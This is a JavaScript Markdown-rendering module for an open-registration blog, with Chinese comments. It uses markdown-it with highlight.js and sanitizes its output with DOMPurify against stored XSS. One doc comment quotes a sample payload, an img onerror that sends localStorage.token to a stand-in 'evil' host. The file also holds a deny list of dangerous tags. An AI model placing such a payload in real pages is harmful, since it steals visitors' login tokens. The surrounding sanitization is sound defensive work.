import MarkdownIt from 'markdown-it'
import DOMPurify from 'dompurify'
import hljs from 'highlight.js/lib/common'
import 'highlight.js/styles/github-dark.css'

// 与编辑器保持一致：html 允许、单换行生效、自动识别链接
const md = new MarkdownIt({ html: true, breaks: true, linkify: true })

// markdown-it v14 已移除旧的 highlight 选项，改用手动覆盖 fence 渲染器来做语法高亮
const defaultFence = md.renderer.rules.fence ||
  ((tokens, idx, options, env, self) => self.renderToken(tokens, idx, options))
md.renderer.rules.fence = (tokens, idx, options, env, self) => {
  const token = tokens[idx]
  // token.info 是 ``` 后面的语言名，可能带额外参数，只取第一段
  const lang = token.info ? token.info.trim().split(/\s+/)[0] : ''
  const code = token.content

  let highlighted
  if (lang && hljs.getLanguage(lang)) {
    try {
      highlighted = hljs.highlight(code, { language: lang, ignoreIllegals: true }).value
    } catch (e) {
      highlighted = md.utils.escapeHtml(code)
    }
  } else {
    // 没写语言或语言不认识：照常转义输出，不破坏内容
    highlighted = md.utils.escapeHtml(code)
  }

  const langClass = lang ? ' language-' + md.utils.escapeHtml(lang) : ''
  return `<pre><code class="hljs${langClass}">${highlighted}</code></pre>\n`
}

/**
 * 把 Markdown 渲染成「已净化」的 HTML。
 *
 * 为什么必须净化：
 *   本站注册是开放的，任何人都能发布文章 / 编辑「关于我」，
 *   而 markdown-it 开着 html 选项会原样输出 HTML。
 *   于是 <img src=x onerror="fetch('//evil/?t='+localStorage.token)"> 这类
 *   内容就能在别人浏览文章时执行，窃取登录令牌（存储型 XSS）。
 *
 * DOMPurify 会去掉 <script>、事件属性（onerror/onclick…）、javascript: 等危险内容，
 * 同时保留正常的排版标签（标题、表格、图片、加粗、下划线等）。
 * 代码块的高亮 span 是纯样式标签，DOMPurify 会放行。
 */
export function renderMarkdown(text) {
  const raw = md.render(text || '')
  const clean = DOMPurify.sanitize(raw, {
    // 允许图片与链接的新窗口属性
    ADD_ATTR: ['target', 'rel'],
    // 明确禁止可能执行脚本或劫持页面的标签
    FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input', 'meta', 'link']
  })
  return wrapCodeBlocks(clean)
}

/**
 * 给每个代码块包一层容器并加「复制」按钮。
 * 注意：这是在 DOMPurify 净化**之后**做的，注入的按钮 HTML 由我们控制，是安全的。
 * 按钮的点击行为由 App.vue 里的全局事件委托统一处理。
 */
function wrapCodeBlocks(html) {
  return html
    .replace(/<pre>/g, '<div class="code-block"><button class="code-copy-btn" type="button">复制</button><pre>')
    .replace(/<\/pre>/g, '</pre></div>')
}

export default renderMarkdown
